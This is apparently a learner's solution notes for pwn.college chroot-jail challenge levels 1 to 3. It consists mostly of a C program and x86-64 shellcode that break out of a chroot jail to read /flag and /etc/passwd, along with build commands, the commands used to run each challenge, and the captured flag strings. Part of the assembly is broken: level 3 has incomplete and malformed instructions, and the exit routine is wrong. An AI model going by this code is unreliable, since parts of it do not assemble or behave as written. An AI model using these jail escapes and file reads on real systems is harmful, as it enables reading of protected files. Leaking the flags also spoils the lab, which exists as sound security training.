/* # ssh -i key hacker@dojo.pwn.college

//# base c file?
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>

int main()
{
        char buf[1024];
        int fd = open("/etc/passwd", 0);
        printf("CWD before chroot: %s\n", getcwd(buf, 128));
        chroot("/tmp");
        printf("CWD after chroot: %s\n", getcwd(buf, 128));
        write(1, buf, read(fd, buf, 1024));
        puts("Goodbye");


}

gcc -o jail jail1.c

# base open s file
.global _start
.intel_syntax noprefix
_start:
    # open files
    mov rsi, 0
    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rax, 2              #syscall 2 opens file
    syscall

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
    syscall

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
    syscall

    #exit
    mov rax, 60
    mov rax, 42
    syscall

#\0 is null terminating for strings
flag:
    .ascii "../../flag\0"

gcc -nostdlib -o solve.elf open.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf

==========================================================================================
==========================================================================================
==========================================================================================

# 1

int main()
{
        char buf[1024];
        int fd = open("/etc/passwd", 0);
        printf("CWD before chroot: %s\n", getcwd(buf, 128));
        chroot("/tmp");
        printf("CWD after chroot: %s\n", getcwd(buf, 128));
        write(1, buf, read(fd, buf, 1024));
        puts("Goodbye");


}

gcc -o jail jail2.c
./jail

cd /
run /challenge/babyjail1 ./flag
pwn.college{c5Ky7b88agQecU5IesTZZp5Eeas.QXxMjMscTOxUzW}

==========================================================================================

# 2
# s file
.global _start
.intel_syntax noprefix
_start:
    # open files
    mov rsi, 0
    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rax, 2              #syscall 2 opens file
    syscall

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
    syscall

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
    syscall

    #exit
    mov rax, 60
    mov rax, 42
    syscall

#\0 is null terminating for strings
flag:
    .ascii "../../flag\0"

gcc -nostdlib -o solve.elf open.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf

/challenge/babyjail2 ../../etc/passwd < ~/solve.bin

pwn.college{sogg6R3HB6XibHocY0FRCQOPDYJ.QXyMjMscTOxUzW}

==========================================================================================

# 3
# s file
.global _start
.intel_syntax noprefix
_start:
    # alternate openat function
	mov rdx
	lea rsi[rip+openat_flag]
	# need parent process to open fd 3 -> embryoio stuff
	mov rdi, 3
	mov rax, 257
	syscall

    # open files
#	mov rsi, 0
#	lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
#	mov rax, 2              #syscall 2 opens file
#	syscall

    #read files
	mov rdi, rax    #file saved in rax from above syscall
	mov rsi, rsp    #move file to readable register
	mov rdx, 100    # reads 100 bytes
	mov rax, 0
	syscall

    #write files
	mov rdi, 1      #write to stdout
	mov rsi, rsp    #moves file to write 
	mov rdx, rax    #reads # of bytes to write
	mov rax, 1
	syscall

    #exit
	mov rax, 60
	mov rax, 42
	syscall

# \0 is null terminating for strings
flag:
    .ascii "../../flag\0"

openat_flag:
	.ascii "flag\0"

gcc -nostdlib -o solve.elf open.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf

/challenge/babyjail_level3 / < solve.bin

pwn.college{Y-yxjDS0DXePwoU1NzAmJeh3daB.QXzMjMscTOxUzW}

==========================================================================================

# 4




















*/

